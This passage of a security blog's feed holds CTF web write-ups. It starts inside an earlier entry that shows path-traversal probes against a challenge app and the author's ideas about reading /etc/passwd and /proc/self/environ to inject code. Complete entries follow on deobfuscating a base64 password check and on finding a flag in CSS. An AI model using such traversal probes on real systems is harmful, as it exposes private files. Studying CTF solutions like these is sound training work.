class="line">				;;</div><div class="line"></div><div class="line">			*.jar|*.war|*.ear|*.xpi|*.zip)</div><div class="line">				if [ -x &amp;#34;`which unzip`&amp;#34; ]; then unzip -v &amp;#34;$1&amp;#34;;</div><div class="line">				elif [ -x &amp;#34;`which miniunzip`&amp;#34; ]; then miniunzip -l &amp;#34;$1&amp;#34;;</div><div class="line">				elif [ -x &amp;#34;`which miniunz`&amp;#34; ]; then miniunz -l &amp;#34;$1&amp;#34;;</div><div class="line">				else echo &amp;#34;No unzip, miniunzip or miniunz available&amp;#34;; fi ;;</div><div class="line"></div><div class="line">			*.7z)</div><div class="line">				if [ -x &amp;#34;`which 7za`&amp;#34; ]; then 7za l &amp;#34;$1&amp;#34;;</div><div class="line">                                elif [ -x &amp;#34;`which 7zr`&amp;#34; ]; then 7zr l &amp;#34;$1&amp;#34;;</div><div class="line">				else echo &amp;#34;No 7za or 7zr available&amp;#34;; fi ;;</div><div class="line"></div><div class="line">			*.zoo)</div><div class="line">				if [ -x &amp;#34;`which zoo`&amp;#34; ]; then zoo v &amp;#34;$1&amp;#34;;</div><div class="line">				elif [ -x &amp;#34;`which unzoo`&amp;#34; ]; then unzoo -l &amp;#34;$1&amp;#34;;</div><div class="line">				else echo &amp;#34;No unzoo or zoo available&amp;#34;; fi ;;</div><div class="line"></div><div class="line">		esac</div><div class="line">	) 2&amp;gt;/dev/null</div><div class="line"></div><div class="line">	if [ $BASENAME = $LESSFILE ]; then</div><div class="line">		if [ -s $TMPFILE ]; then</div><div class="line">			echo $TMPFILE</div><div class="line">		else</div><div class="line">			rm -f $TMPFILE</div><div class="line">		fi</div><div class="line">	fi</div><div class="line"></div><div class="line">elif [ $# -eq 2 ] ; then</div><div class="line">	#</div><div class="line">	# we were called as LESSCLOSE</div><div class="line">	# delete the file created if we were lessfile</div><div class="line">	#</div><div class="line">	if [ $BASENAME = $LESSFILE ]; then</div><div class="line">		if [ -n &amp;#34;$BASH&amp;#34; ]; then</div><div class="line">			if [ ! -O &amp;#34;$2&amp;#34; ]; then</div><div class="line">				echo &amp;#34;Error in deleting $2&amp;#34; &amp;gt; /dev/tty</div><div class="line">			fi</div><div class="line">		fi</div><div class="line"></div><div class="line">		if [ -f &amp;#34;$2&amp;#34; ]; then</div><div class="line">			rm -f &amp;#34;$2&amp;#34;</div><div class="line">		else</div><div class="line">			echo &amp;#34;Error in deleting $2&amp;#34; &amp;gt; /dev/tty</div><div class="line">		fi</div><div class="line">	fi</div><div class="line"></div><div class="line">elif [ $# -eq 0 ] ; then</div><div class="line">	#</div><div class="line">	# must setup shell to use LESSOPEN/LESSCLOSE</div><div class="line">	#</div><div class="line">	# I have no idea how some of the more esoteric shells (es, rc) do</div><div class="line">	# things. If they don&amp;#39;t do things in a Bourne manner, send me a patch</div><div class="line">	# and I&amp;#39;ll incorporate it.</div><div class="line">	#</div><div class="line"></div><div class="line">	# first determine the full path of lessfile/lesspipe</div><div class="line">	# if you can determine a better way to do this, send me a patch, I&amp;#39;ve</div><div class="line">	# not shell-scripted for many a year.</div><div class="line">	FULLPATH=`cd \`dirname $0\`;pwd`/$BASENAME</div><div class="line"></div><div class="line">	case &amp;#34;$SHELL&amp;#34; in</div><div class="line">		*csh)</div><div class="line">			if [ $BASENAME = $LESSFILE ]; then</div><div class="line">				echo &amp;#34;setenv LESSOPEN \&amp;#34;$FULLPATH %s\&amp;#34;;&amp;#34;</div><div class="line">				echo &amp;#34;setenv LESSCLOSE \&amp;#34;$FULLPATH %s %s\&amp;#34;;&amp;#34;</div><div class="line">			else</div><div class="line">				echo &amp;#34;setenv LESSOPEN \&amp;#34;| $FULLPATH %s\&amp;#34;;&amp;#34;</div><div class="line">				echo &amp;#34;setenv LESSCLOSE \&amp;#34;$FULLPATH %s %s\&amp;#34;;&amp;#34;</div><div class="line">			fi</div><div class="line">			;;</div><div class="line">		*)</div><div class="line">			if [ $BASENAME = $LESSFILE ]; then</div><div class="line">				echo &amp;#34;export LESSOPEN=\&amp;#34;$FULLPATH %s\&amp;#34;;&amp;#34;</div><div class="line">				echo &amp;#34;export LESSCLOSE=\&amp;#34;$FULLPATH %s %s\&amp;#34;;&amp;#34;</div><div class="line">			else</div><div class="line">				echo &amp;#34;export LESSOPEN=\&amp;#34;| $FULLPATH %s\&amp;#34;;&amp;#34;</div><div class="line">				echo &amp;#34;export LESSCLOSE=\&amp;#34;$FULLPATH %s %s\&amp;#34;;&amp;#34;</div><div class="line">			fi</div><div class="line">			;;</div><div class="line">	esac</div><div class="line"></div><div class="line">	#echo &amp;#34;# If you tried to view a file with a name that starts with &amp;#39;#&amp;#39;, you&amp;#34;</div><div class="line">	#echo &amp;#34;# might see this message instead of the file&amp;#39;s contents.&amp;#34;</div><div class="line">	#echo &amp;#34;# To view the contents, try to put &amp;#39;./&amp;#39; ahead of the filename when&amp;#34;</div><div class="line">	#echo &amp;#34;# calling less.&amp;#34;</div><div class="line"></div><div class="line">else</div><div class="line">	echo &amp;#34;Usage: eval \`$BASENAME\`&amp;#34;</div><div class="line">	exit</div><div class="line">fi</div></pre></td></tr></table></figure>
<p>bork=../../../../../tmp/tmux-1000/default : youtube video</p>
<p>bork=../../../../../var/mail/ctfuser : No such file or directory</p>
<p>bork=../../../../../dev/pts/4 : Permission denied</p>
<p>bork=../../../../../home/ctfuser/Web-300/app/bork.py : youtube video</p>
<p>We thought that a logical way to solve the challenge was to display <code>/etc/passwd</code> and then some file inside like <code>flag.txt</code> or to inject commands like <code>ls</code> but that didn’t work.</p>
<p>Another way we thought was to leak <code>/proc/self/environ</code> and them inject some code with user agent but there was not some <code>HTTP_USER_AGENT</code> environment variable.</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Informations&quot;&gt;&lt;a href=&quot;#Informations&quot; class=&quot;headerlink&quot; title=&quot;Informations&quot;&gt;&lt;/a&gt;Informations&lt;/h2&gt;&lt;h3 id=&quot;Version&quot;&gt;&lt;a href=&quot;#Versio
    
    </summary>
    
      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
    
    
      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
    
      <category term="web" scheme="http://rawsec.ml/tags/web/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
    
      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>Qiwi-Infosec CTF - 100 - javascript - Web</title>
    <link href="http://rawsec.ml/en/QiwiInfosecCTF-2016-web-100-javascript/"/>
    <id>http://rawsec.ml/en/QiwiInfosecCTF-2016-web-100-javascript/</id>
    <published>2016-11-20T23:00:00.000Z</published>
    <updated>2016-11-22T22:50:01.201Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
<thead>
<tr>
<th>By</th>
<th>Version</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>noraj</td>
<td>1.0</td>
<td>Creation</td>
</tr>
</tbody>
</table>
<h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
<li><strong>Name</strong> : Qiwi-Infosec CTF-2016</li>
<li><strong>Website</strong> : <a href="https://qiwictf.ru/" target="_blank" rel="external">https://qiwictf.ru/</a></li>
<li><strong>Type</strong> : Online</li>
<li><strong>Format</strong> : Jeopardy</li>
<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/385" target="_blank" rel="external">link</a></li>
</ul>
<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><blockquote>
<p>we don’t want to make any interface. just solve it</p>
</blockquote>
<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>We have a packed javascript code:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">eval</span>(<span class="function"><span class="keyword">function</span>(<span class="params">p,a,c,k,e,d</span>)</span>&#123;e=<span class="function"><span class="keyword">function</span>(<span class="params">c</span>)</span>&#123;<span class="keyword">return</span>(c&amp;lt;a?<span class="string">''</span>:e(<span class="built_in">parseInt</span>(c/a)))+((c=c%a)&amp;gt;<span class="number">35</span>?<span class="built_in">String</span>.fromCharCode(c+<span class="number">29</span>):c.toString(<span class="number">36</span>))&#125;;<span class="keyword">if</span>(!<span class="string">''</span>.replace(<span class="regexp">/^/</span>,<span class="built_in">String</span>))&#123;<span class="keyword">while</span>(c--)&#123;d[e(c)]=k[c]||e(c)&#125;k=[<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">return</span> d[e]&#125;];e=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span><span class="string">'\\w+'</span>&#125;;c=<span class="number">1</span>&#125;;<span class="keyword">while</span>(c--)&#123;<span class="keyword">if</span>(k[c])&#123;p=p.replace(<span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">'\\b'</span>+e(c)+<span class="string">'\\b'</span>,<span class="string">'g'</span>),k[c])&#125;&#125;<span class="keyword">return</span> p&#125;(<span class="string">'18 10()&#123;1a(1b("%o%p%9%3%8%g%a%9%0%1%9%3%a%5%1%6%e%8%2%7%0%F%b%0%0%0%0%j%4%2%0%3%c%4%2%e%0%d%0%G%u%M%D%1c%1d%N%16%11%13%14%17%15%R%w%19%1p%1l%Q%1m%P%1n%U%12%X%V%Y%4%i%3%5%1%o%t%c%g%z%1o%m%1e%9%a%L%1k%2%e%8%p%j%A%1j%1f%E%q%l%s%v%O%1g%n%1h%I%Z%r%1i%d%G%f%b%0%0%0%0%j%4%2%0%1%9%3%a%5%1%5%0%d%0%C%B%f%b%0%0%0%0%j%4%2%0%3%0%d%0%q%f%b%0%0%0%0%A%c%g%m%1%0%6%3%0%k%0%e%8%2%h%m%1%9%t%8%c%7%0%F%b%0%0%0%0%0%0%0%0%j%4%2%0%i%q%0%d%0%e%8%2%h%3%c%4%2%D%a%5%1%u%8%6%3%r%r%7%f%b%0%0%0%0%0%0%0%0%j%4%2%0%i%l%0%d%0%e%8%2%h%3%c%4%2%D%a%5%1%u%8%6%3%r%r%7%f%b%0%0%0%0%0%0%0%0%j%4%2%0%i%s%0%d%0%e%8%2%h%3%c%4%2%D%a%5%1%u%8%6%3%r%r%7%f%b%0%0%0%0%0%0%0%0%j%4%2%0%i%p%o%0%d%0%6%i%q%0%k%k%0%l%n%7%0%r%0%6%6%i%l%0%J%J%0%q%7%0%k%k%0%I%7%0%r%0%6%i%s%0%J%J%0%q%7%f%b%0%0%0%0%0%0%0%0%j%4%2%0%g%q%0%d%0%6%i%p%o%0%K%0%6%n%v%0%k%k%0%l%I%7%7%0%y%y%0%l%I%f%b%0%0%0%0%0%0%0%0%j%4%2%0%g%l%0%d%0%6%i%p%o%0%K%0%6%n%v%0%k%k%0%l%s%7%7%0%y%y%0%l%s%f%b%0%0%0%0%0%0%0%0%j%4%2%0%g%s%0%d%0%g%e%w%4%w%6%i%l%7%0%T%0%n%O%0%S%0%6%i%p%o%0%K%0%6%n%v%0%k%k%0%n%7%7%0%y%y%0%n%f%b%0%0%0%0%0%0%0%0%j%4%2%0%g%v%0%d%0%g%e%w%4%w%6%i%s%7%0%T%0%n%O%0%S%0%6%i%p%o%0%K%0%n%v%7%f%b%0%0%0%0%0%0%0%0%1%9%3%a%5%1%5%C%1%9%3%a%5%1%5%h%m%1%9%t%8%c%B%0%d%0%3%c%4%2%e%h%3%c%4%2%u%8%6%g%q%7%f%b%0%0%0%0%0%0%0%0%1%9%3%a%5%1%5%C%1%9%3%a%5%1%5%h%m%1%9%t%8%c%B%0%d%0%3%c%4%2%e%h%3%c%4%2%u%8%6%g%l%7%f%b%0%0%0%0%0%0%0%0%1%9%3%a%5%1%5%C%1%9%3%a%5%1%5%h%m%1%9%t%8%c%B%0%d%0%3%c%4%2%e%h%3%c%4%2%u%8%6%g%s%7%f%b%0%0%0%0%0%0%0%0%1%9%3%a%5%1%5%C%1%9%3%a%5%1%5%h%m%1%9%t%8%c%B%0%d%0%3%c%4%2%e%h%3%c%4%2%u%8%6%g%v%7%f%b%0%0%0%0%H%b%0%0%0%0%2%1%8%p%2%9%0%1%9%3%a%5%1%5%h%z%a%g%9%6%G%G%7%f%b%0%H%b%g%o%0%6%1%9%3%a%5%1%6%3%8%o%h%L%4%e%e%A%a%2%5%h%j%4%m%p%1%7%0%d%d%0%x%4%z%Q%s%w%11%w%z%3%z%N%A%5%N%Z%o%X%E%M%g%Y%9%U%E%V%E%Q%q%R%P%M%p%x%7%F%4%m%1%2%8%6%x%P%c%4%8%0%2%g%t%c%8%W%x%7%f%H%1%m%e%1%F%4%m%1%2%8%6%x%12%2%a%9%t%0%L%4%e%e%A%a%2%5%W%x%7%f%H%0%b"))&#125;10();'</span>,<span class="number">62</span>,<span class="number">88</span>,<span class="string">'20|65|72|63|61|64|28|29|74|6E|6F|0A|68|3D|73|3B|69|2E|62|76|3C|31|6C|36|66|75|30|2B|32|67|41|33|4E|22|3E|6A|77|5D|5B|43|7A|7B|27|7D|38|7C|26|70|42|46|34|54|52|4D|3A|3F|56|59|21|58|5A|39|check|48|57|49|4A|4C|47|4B|function|4F|eval|unescape|44|45|6D|79|35|37|2F|78|71|51|53|55|6B|50'</span>.split(<span class="string">'|'</span>),<span class="number">0</span>,&#123;&#125;))</div></pre></td></tr></table></figure>
<p>I used a javascript desobfuscator: <a href="http://matthewfl.com/unPacker.html" target="_blank" rel="external">http://matthewfl.com/unPacker.html</a>.</p>
<p>That gave me the following partially unpacked code:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span></div><div class="line">	&#123;</div><div class="line">	<span class="built_in">eval</span>(<span class="built_in">unescape</span>(<span class="string">"%66%75%6E%63%74%69%6F%6E%20%65%6E%63%6F%64%65%28%73%74%72%29%20%7B%0A%20%20%20%20%76%61%72%20%63%68%61%72%73%20%3D%20%27%41%42%43%44%45%46%47%48%49%4A%4B%4C%4D%4E%4F%50%51%52%53%54%55%56%57%58%59%5A%61%62%63%64%65%66%67%68%69%6A%6B%6C%6D%6E%6F%70%71%72%73%74%75%76%77%78%79%7A%30%31%32%33%34%35%36%37%38%39%2B%2F%3D%27%3B%0A%20%20%20%20%76%61%72%20%65%6E%63%6F%64%65%64%20%3D%20%5B%5D%3B%0A%20%20%20%20%76%61%72%20%63%20%3D%20%30%3B%0A%20%20%20%20%77%68%69%6C%65%20%28%63%20%3C%20%73%74%72%2E%6C%65%6E%67%74%68%29%20%7B%0A%20%20%20%20%20%20%20%20%76%61%72%20%62%30%20%3D%20%73%74%72%2E%63%68%61%72%43%6F%64%65%41%74%28%63%2B%2B%29%3B%0A%20%20%20%20%20%20%20%20%76%61%72%20%62%31%20%3D%20%73%74%72%2E%63%68%61%72%43%6F%64%65%41%74%28%63%2B%2B%29%3B%0A%20%20%20%20%20%20%20%20%76%61%72%20%62%32%20%3D%20%73%74%72%2E%63%68%61%72%43%6F%64%65%41%74%28%63%2B%2B%29%3B%0A%20%20%20%20%20%20%20%20%76%61%72%20%62%75%66%20%3D%20%28%62%30%20%3C%3C%20%31%36%29%20%2B%20%28%28%62%31%20%7C%7C%20%30%29%20%3C%3C%20%38%29%20%2B%20%28%62%32%20%7C%7C%20%30%29%3B%0A%20%20%20%20%20%20%20%20%76%61%72%20%69%30%20%3D%20%28%62%75%66%20%26%20%28%36%33%20%3C%3C%20%31%38%29%29%20%3E%3E%20%31%38%3B%0A%20%20%20%20%20%20%20%20%76%61%72%20%69%31%20%3D%20%28%62%75%66%20%26%20%28%36%33%20%3C%3C%20%31%32%29%29%20%3E%3E%20%31%32%3B%0A%20%20%20%20%20%20%20%20%76%61%72%20%69%32%20%3D%20%69%73%4E%61%4E%28%62%31%29%20%3F%20%36%34%20%3A%20%28%62%75%66%20%26%20%28%36%33%20%3C%3C%20%36%29%29%20%3E%3E%20%36%3B%0A%20%20%20%20%20%20%20%20%76%61%72%20%69%33%20%3D%20%69%73%4E%61%4E%28%62%32%29%20%3F%20%36%34%20%3A%20%28%62%75%66%20%26%20%36%33%29%3B%0A%20%20%20%20%20%20%20%20%65%6E%63%6F%64%65%64%5B%65%6E%63%6F%64%65%64%2E%6C%65%6E%67%74%68%5D%20%3D%20%63%68%61%72%73%2E%63%68%61%72%41%74%28%69%30%29%3B%0A%20%20%20%20%20%20%20%20%65%6E%63%6F%64%65%64%5B%65%6E%63%6F%64%65%64%2E%6C%65%6E%67%74%68%5D%20%3D%20%63%68%61%72%73%2E%63%68%61%72%41%74%28%69%31%29%3B%0A%20%20%20%20%20%20%20%20%65%6E%63%6F%64%65%64%5B%65%6E%63%6F%64%65%64%2E%6C%65%6E%67%74%68%5D%20%3D%20%63%68%61%72%73%2E%63%68%61%72%41%74%28%69%32%29%3B%0A%20%20%20%20%20%20%20%20%65%6E%63%6F%64%65%64%5B%65%6E%63%6F%64%65%64%2E%6C%65%6E%67%74%68%5D%20%3D%20%63%68%61%72%73%2E%63%68%61%72%41%74%28%69%33%29%3B%0A%20%20%20%20%7D%0A%20%20%20%20%72%65%74%75%72%6E%20%65%6E%63%6F%64%65%64%2E%6A%6F%69%6E%28%27%27%29%3B%0A%20%7D%0A%69%66%20%28%65%6E%63%6F%64%65%28%63%74%66%2E%70%61%73%73%77%6F%72%64%2E%76%61%6C%75%65%29%20%3D%3D%20%22%61%6A%52%32%4E%48%4E%6A%63%6A%46%77%64%46%39%66%58%7A%42%69%5A%6E%56%7A%59%7A%52%30%4D%54%42%75%22%29%7B%61%6C%65%72%74%28%22%54%68%61%74%20%72%69%67%68%74%21%22%29%3B%7D%65%6C%73%65%7B%61%6C%65%72%74%28%22%57%72%6F%6E%67%20%70%61%73%73%77%6F%72%64%21%22%29%3B%7D%20%0A"</span>))</div><div class="line">&#125;</div><div class="line">check();</div></pre></td></tr></table></figure>
<p>SO I ran the <code>uneascape()</code> function and that gave me this clear code:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params">str</span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> chars = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='</span>;</div><div class="line">    <span class="keyword">var</span> encoded = [];</div><div class="line">    <span class="keyword">var</span> c = <span class="number">0</span>;</div><div class="line">    <span class="keyword">while</span> (c &lt; str.length) &#123;</div><div class="line">        <span class="keyword">var</span> b0 = str.charCodeAt(c++);</div><div class="line">        <span class="keyword">var</span> b1 = str.charCodeAt(c++);</div><div class="line">        <span class="keyword">var</span> b2 = str.charCodeAt(c++);</div><div class="line">        <span class="keyword">var</span> buf = (b0 &lt;&lt; <span class="number">16</span>) + ((b1 || <span class="number">0</span>) &lt;&lt; <span class="number">8</span>) + (b2 || <span class="number">0</span>);</div><div class="line">        <span class="keyword">var</span> i0 = (buf &amp; (<span class="number">63</span> &lt;&lt; <span class="number">18</span>)) &gt;&gt; <span class="number">18</span>;</div><div class="line">        <span class="keyword">var</span> i1 = (buf &amp; (<span class="number">63</span> &lt;&lt; <span class="number">12</span>)) &gt;&gt; <span class="number">12</span>;</div><div class="line">        <span class="keyword">var</span> i2 = <span class="built_in">isNaN</span>(b1) ? <span class="number">64</span> : (buf &amp; (<span class="number">63</span> &lt;&lt; <span class="number">6</span>)) &gt;&gt; <span class="number">6</span>;</div><div class="line">        <span class="keyword">var</span> i3 = <span class="built_in">isNaN</span>(b2) ? <span class="number">64</span> : (buf &amp; <span class="number">63</span>);</div><div class="line">        encoded[encoded.length] = chars.charAt(i0);</div><div class="line">        encoded[encoded.length] = chars.charAt(i1);</div><div class="line">        encoded[encoded.length] = chars.charAt(i2);</div><div class="line">        encoded[encoded.length] = chars.charAt(i3);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> encoded.join(<span class="string">''</span>);</div><div class="line"> &#125;</div><div class="line"><span class="keyword">if</span> (encode(ctf.password.value) == <span class="string">"ajR2NHNjcjFwdF9fXzBiZnVzYzR0MTBu"</span>)&#123;alert(<span class="string">"That right!"</span>);&#125;<span class="keyword">else</span>&#123;alert(<span class="string">"Wrong password!"</span>);&#125;</div></pre></td></tr></table></figure>
<p>We can see that once encoded the password need to match <code>ajR2NHNjcjFwdF9fXzBiZnVzYzR0MTBu</code>.</p>
<p>Take a look: <code>var chars = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&#39;;</code> is the base64 alphabet.<br>Try to decode <code>ajR2NHNjcjFwdF9fXzBiZnVzYzR0MTBu</code> in base64 and we get <code>j4v4scr1pt___0bfusc4t10n</code>.</p>
<p>Just to check, execute <code>encode(&#39;j4v4scr1pt___0bfusc4t10n&#39;)</code> and you get <code>ajR2NHNjcjFwdF9fXzBiZnVzYzR0MTBu</code>.</p>
<p>So this obfuscated function is just doing base64. Our flag is <code>j4v4scr1pt___0bfusc4t10n</code>.</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Informations&quot;&gt;&lt;a href=&quot;#Informations&quot; class=&quot;headerlink&quot; title=&quot;Informations&quot;&gt;&lt;/a&gt;Informations&lt;/h2&gt;&lt;h3 id=&quot;Version&quot;&gt;&lt;a href=&quot;#Versio
    
    </summary>
    
      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
    
    
      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
    
      <category term="web" scheme="http://rawsec.ml/tags/web/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
    
      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>RC3 CTF - 100 - Who&#39;s a good boy - Web</title>
    <link href="http://rawsec.ml/en/RC3CTF-2016-web-100-Who-s-a-good-boy/"/>
    <id>http://rawsec.ml/en/RC3CTF-2016-web-100-Who-s-a-good-boy/</id>
    <published>2016-11-20T23:00:00.000Z</published>
    <updated>2016-11-22T22:50:01.171Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
<thead>
<tr>
<th>By</th>
<th>Version</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>noraj</td>
<td>1.0</td>
<td>Creation</td>
</tr>
</tbody>
</table>
<h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
<li><strong>Name</strong> : RC3 CTF 2016</li>
<li><strong>Website</strong> : <a href="http://ctf.rc3.club/" target="_blank" rel="external">http://ctf.rc3.club/</a></li>
<li><strong>Type</strong> : Online</li>
<li><strong>Format</strong> : Jeopardy</li>
<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/389" target="_blank" rel="external">link</a></li>
</ul>
<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><blockquote>
<p>You’re trying to see the cute dog pictures on ctf.rc3.club. But every time you click on one of them, it brings you to a bad gateway.</p>
<p><a href="https://ctf.rc3.club:3000/" target="_blank" rel="external">https://ctf.rc3.club:3000/</a></p>
<p>– Your friendly neighborhood webadmin</p>
</blockquote>
<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>We can see that one of the image is not like all others:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">[...]</div><div class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">class</span>=<span class="string">"phil me up"</span></span></div><div class="line"><span class="attr">src</span>=<span class="string">"http://admissions.vanderbilt.edu/insidedores/manage/wp-content/uploads/doge-pattern-27481-2880x1800.jpg"</span>&gt;</div><div class="line"><span class="tag">&lt;<span class="name">h4</span>&gt;</span>the absolute mostest?<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">class</span>=<span class="string">"philarydufflebag"</span></span></div><div class="line"><span class="attr">src</span>=<span class="string">"http://admissions.vanderbilt.edu/insidedores/doge/this-aint-the-RC3-flag-we're-getting-there-though.jpg"</span>&gt;</div><div class="line"><span class="tag">&lt;<span class="name">h4</span>&gt;</span>CTF flags!!1!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">class</span>=<span class="string">"guys the flag is!"</span></span></div><div class="line"><span class="attr">src</span>=<span class="string">"http://admissions.vanderbilt.edu/insidedores/manage/wp-content/uploads/doge-pattern-27481-2880x1800.jpg"</span>&gt;</div><div class="line"><span class="tag">&lt;<span class="name">h4</span>&gt;</span>Find the Phil<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line">[...]</div></pre></td></tr></table></figure>
<p>But this image doesn’t exist, and is not cached in the WayBackMachine.</p>
<p>Each image has a different class:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">&lt;img class="why hello there"</div><div class="line">&lt;img class="try not to get too distracted"</div><div class="line">&lt;img class="or infuriated"</div><div class="line">&lt;img class="don't give up, you can do it!"</div><div class="line">&lt;img class="hey, by the way"</div><div class="line">&lt;img class="have you ever"</div><div class="line">&lt;img class="heard of phil"</div><div class="line">&lt;img class="phil's a good name"</div><div class="line">&lt;img class="philly phil phil"</div><div class="line">&lt;img class="philthy phil"</div><div class="line">&lt;img class="now if only there was a way to philter out this nonsense"</div><div class="line">&lt;img class="phil likes phalgs?"</div><div class="line">&lt;img class="phil's gone phishing"</div><div class="line">&lt;img class ="philet-o-phish"</div><div class="line">&lt;img class= "philament"</div><div class="line">&lt;img class = "philanthropy"</div><div class="line">&lt;img class="phil me up"</div><div class="line">&lt;img class="philarydufflebag"</div><div class="line">&lt;img class="guys the flag is!"</div><div class="line">&lt;img class="phil pills r phor phil's phlegm"</div><div class="line">&lt;img class="not phil nor phlag"</div><div class="line">&lt;img class=i like scary philms"</div><div class="line">&lt;img class=phillllllyy"</div><div class="line">&lt;img class= philadelphia"</div><div class="line">&lt;img class="fill me up with dreams of phil"</div><div class="line">&lt;img class="still not phil"</div><div class="line">&lt;img class="also not phil"</div><div class="line">&lt;img class="not phil"</div></pre></td></tr></table></figure>
<p>See what is the mess in the css:</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="selector-attr">[...]</span></div><div class="line"><span class="selector-class">.philarydufflebag</span>&#123;</div><div class="line"></div><div class="line"><span class="comment">/*hiya*/</span></div><div class="line"><span class="comment">/*compress your frontend*/</span></div><div class="line"><span class="comment">/*here's a flag :)*/</span></div><div class="line"><span class="attribute">flag</span>:RC3-<span class="number">2016</span>-CanineSS</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>Flag was not well hidden: <code>RC3-2016-CanineSS</code>.</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Informations&quot;&gt;&lt;a href=&quot;#Informations&quot; class=&quot;headerlink&quot; title=&quot;Informations&quot;&gt;&lt;/a&gt;Informations&lt;/h2&gt;&lt;h3 id=&quot;Version&quot;&gt;&lt;a href=&quot;#Versio
    
    </summary>
    
      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
    
    
      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
    
      <category term="web" scheme="http://rawsec.ml/tags/web/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
    
      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>ArchLinux - Monitor copy progression with Advanced Copy patch</title>
    <link href="http://rawsec.ml/en/archlinux-monitor-copy-progression-with-advanced-copy-patch/"/>
    <id>http://rawsec.ml/en/archlinux-monitor-copy-progression-with-advanced-copy-patch/</id>
    <published>2016-11-12T23:00:00.000Z</published>
    <updated>2016-11-13T16:49:39.147Z</updated>
    
